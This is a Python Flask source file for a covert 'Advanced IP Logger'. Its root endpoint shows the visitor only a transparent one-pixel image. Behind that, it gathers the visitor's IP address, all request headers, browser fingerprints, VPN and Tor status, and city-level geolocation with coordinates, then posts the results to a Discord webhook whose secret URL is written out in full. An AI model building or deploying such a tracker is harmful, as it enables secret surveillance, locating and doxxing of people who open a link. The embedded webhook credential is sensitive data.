from flask import Flask, request, jsonify
import requests
import json
from datetime import datetime
import user_agents
import socket
import uuid
import hashlib
import time

app = Flask(__name__)

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1371421337154752542/nIiDoeeHEkLqIau1AXMshZB18QoDZgSRc__7Gew16p-96UX7HYWpZcs-6lLi8Os5XBwk"
TRACKING_PIXEL = "https://i.imgur.com/transparent.png"  # 1x1 transparent PNG

def get_ip_info(ip):
    """Get detailed IP information from IP-API"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3)
        if response.status_code == 200:
            return response.json()
    except:
        return None
    return None

def generate_canvas_fingerprint(request):
    """Generate a simulated canvas fingerprint"""
    components = [
        request.headers.get('User-Agent', ''),
        request.headers.get('Accept-Language', ''),
        str(request.headers.get('Screen-Width', '')),
        str(request.headers.get('Screen-Height', '')),
        str(request.headers.get('Device-Memory', '')),
        str(request.headers.get('Hardware-Concurrency', ''))
    ]
    return hashlib.sha256('|'.join(components).encode()).hexdigest()[:16]

def get_client_info():
    """Collect comprehensive client information with enhanced VPN detection"""
    # Get real IP through various methods
    ip = request.headers.get('CF-Connecting-IP', 
          request.headers.get('X-Real-IP', 
          request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()))

    # Get detailed IP information
    ip_info = get_ip_info(ip)

    # Parse user agent
    ua = user_agents.parse(request.headers.get('User-Agent', ''))

    # Generate various fingerprints
    canvas_fp = generate_canvas_fingerprint(request)
    session_id = str(uuid.uuid4())

    # Get screen dimensions if available
    screen_width = request.headers.get('Screen-Width', 'Unknown')
    screen_height = request.headers.get('Screen-Height', 'Unknown')

    # Get timezone
    timezone_offset = request.headers.get('Timezone-Offset', 'Unknown')

    # Build complete data object
    return {
        "ip_address": ip,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "user_agent": str(ua),
        "session_id": session_id,
        "fingerprints": {
            "canvas": canvas_fp,
            "session": session_id,
            "device": hashlib.md5(str(ua.device).encode()).hexdigest()[:8]
        },
        "device_info": {
            "browser": f"{ua.browser.family} {ua.browser.version_string}",
            "os": f"{ua.os.family} {ua.os.version_string}",
            "device": ua.device.family,
            "type": 'Mobile' if ua.is_mobile else 'Tablet' if ua.is_tablet else 'PC' if ua.is_pc else 'Bot' if ua.is_bot else 'Unknown',
            "screen": f"{screen_width}x{screen_height}",
            "timezone": timezone_offset,
            "touch_support": ua.is_touch_capable,
            "is_bot": ua.is_bot
        },
        "network_info": {
            "hostname": socket.getfqdn(ip) if not ip.replace('.', '').isdigit() else ip,
            "asn": ip_info.get('as', 'Unknown') if ip_info else 'Unknown',
            "isp": ip_info.get('isp', 'Unknown') if ip_info else 'Unknown',
            "organization": ip_info.get('org', 'Unknown') if ip_info else 'Unknown',
            "proxy": ip_info.get('proxy', False) if ip_info else False,
            "vpn": ip_info.get('hosting', False) if ip_info else False,
            "tor": ip_info.get('tor', False) if ip_info else False
        },
        "geolocation": {
            "country": ip_info.get('country', 'Unknown') if ip_info else 'Unknown',
            "region": ip_info.get('regionName', 'Unknown') if ip_info else 'Unknown',
            "city": ip_info.get('city', 'Unknown') if ip_info else 'Unknown',
            "zip": ip_info.get('zip', 'Unknown') if ip_info else 'Unknown',
            "coordinates": {
                "lat": ip_info.get('lat', 'Unknown') if ip_info else 'Unknown',
                "lon": ip_info.get('lon', 'Unknown') if ip_info else 'Unknown'
            },
            "timezone": ip_info.get('timezone', 'Unknown') if ip_info else 'Unknown'
        },
        "headers": {k: v for k, v in request.headers.items()},
        "lookup_links": {
            "ip_api": f"http://ip-api.com/#{ip}",
            "abuseipdb": f"https://www.abuseipdb.com/check/{ip}",
            "ip2location": f"https://www.ip2location.com/demo/{ip}",
            "ipqualityscore": f"https://www.ipqualityscore.com/free-ip-lookup-proxy-vpn-test/lookup/{ip}",
            "grepip": f"https://grepip.com/{ip}"
        }
    }

def format_discord_message(data):
    """Format all the collected data into a rich Discord embed"""
    # Create fields for Discord embed
    fields = []

    # Basic Info
    fields.append({
        "name": "🌐 IP Information",
        "value": f"```{data['ip_address']}```\n" +
                 f"• **ASN**: {data['network_info']['asn']}\n" +
                 f"• **ISP**: {data['network_info']['isp']}\n" +
                 f"• **Proxy/VPN**: {'✅' if data['network_info']['vpn'] or data['network_info']['proxy'] else '❌'}" +
                 f" ({'Tor' if data['network_info']['tor'] else 'VPN' if data['network_info']['vpn'] else 'Proxy' if data['network_info']['proxy'] else 'None'})",
        "inline": True
    })

    # Location Info
    location_text = f"• **Country**: {data['geolocation']['country']}\n" +
                   f"• **Region**: {data['geolocation']['region']}\n" +
                   f"• **City**: {data['geolocation']['city']}\n" +
                   f"• **ZIP**: {data['geolocation']['zip']}\n" +
                   f"• **Coordinates**: {data['geolocation']['coordinates']['lat']}, {data['geolocation']['coordinates']['lon']}"

    fields.append({
        "name": "📍 Geolocation",
        "value": location_text,
        "inline": True
    })

    # Device Info
    device_text = f"• **OS**: {data['device_info']['os']}\n" +
                 f"• **Browser**: {data['device_info']['browser']}\n" +
                 f"• **Device**: {data['device_info']['device']} ({data['device_info']['type']})\n" +
                 f"• **Screen**: {data['device_info']['screen']}\n" +
                 f"• **Touch**: {'Yes' if data['device_info']['touch_support'] else 'No'}"

    fields.append({
        "name": "📱 Device Information",
        "value": device_text,
        "inline": False
    })

    # Fingerprints
    fields.append({
        "name": "🆔 Fingerprints",
        "value": f"• **Canvas**: `{data['fingerprints']['canvas']}`\n" +
                f"• **Device**: `{data['fingerprints']['device']}`\n" +
                f"• **Session**: `{data['fingerprints']['session']}`",
        "inline": False
    })

    # Lookup Links
    links_text = "\n".join([f"• [{service.upper()}]({url})" for service, url in data['lookup_links'].items()])

    fields.append({
        "name": "🔗 Lookup Links",
        "value": links_text,
        "inline": False
    })

    # Create embed
    embed = {
        "title": "🔍 Advanced Visitor Tracking Report",
        "color": 0x5865F2,
        "fields": fields,
        "footer": {
            "text": f"Tracked at {data['timestamp']} | Session ID: {data['session_id']}"
        },
        "thumbnail": {
            "url": "https://i.imgur.com/J5qKXWq.png"
        }
    }

    return {
        "username": "Advanced IP Logger",
        "avatar_url": "https://i.imgur.com/J5qKXWq.png",
        "embeds": [embed]
    }

@app.route('/')
def track():
    """Main tracking endpoint"""
    data = get_client_info()
    discord_payload = format_discord_message(data)

    try:
        requests.post(WEBHOOK_URL, json=discord_payload)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

    # Return transparent pixel
    return f'<img src="{TRACKING_PIXEL}" width="1" height="1" />', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
